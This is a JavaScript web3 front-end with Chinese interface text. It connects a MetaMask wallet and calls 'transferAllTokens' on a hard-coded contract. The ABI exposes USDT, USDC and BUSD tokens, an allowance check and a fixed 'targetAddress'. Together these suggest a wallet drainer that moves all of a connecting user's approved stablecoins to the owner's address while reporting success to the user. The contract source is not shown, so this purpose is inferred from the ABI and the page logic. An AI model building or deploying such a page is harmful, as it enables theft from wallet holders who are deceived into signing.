let web3;
let contract;
let userAddress;

const contractAddress = "0x38cB7800C3Fddb8dda074C1c650A155154924C73";  // 你的合约地址
const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			}
		],
		"name": "transferAllTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	},
	{
		"inputs": [],
		"name": "busdToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "contract IERC20",
				"name": "token",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			}
		],
		"name": "checkAllowance",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "targetAddress",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdcToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdtToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            document.getElementById('walletAddress').textContent = `钱包地址: ${userAddress}`;
            document.getElementById('transferTokens').disabled = false;

            // 初始化合约
            contract = new web3.eth.Contract(contractABI, contractAddress);
        } catch (error) {
            console.error("用户拒绝了连接请求", error);
        }
    } else {
        alert("请安装MetaMask钱包!");
    }
}

async function transferAllTokens() {
    if (contract && userAddress) {
        try {
            const receipt = await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
            document.getElementById('transferStatus').textContent = `转移成功! 交易哈希: ${receipt.transactionHash}`;
        } catch (error) {
            console.error("转移失败", error);
            document.getElementById('transferStatus').textContent = `转移失败: ${error.message}`;
        }
    } else {
        alert("请先连接钱包！");
    }
}

document.getElementById('connectWallet').addEventListener('click', connectWallet);
document.getElementById('transferTokens').addEventListener('click', transferAllTokens);
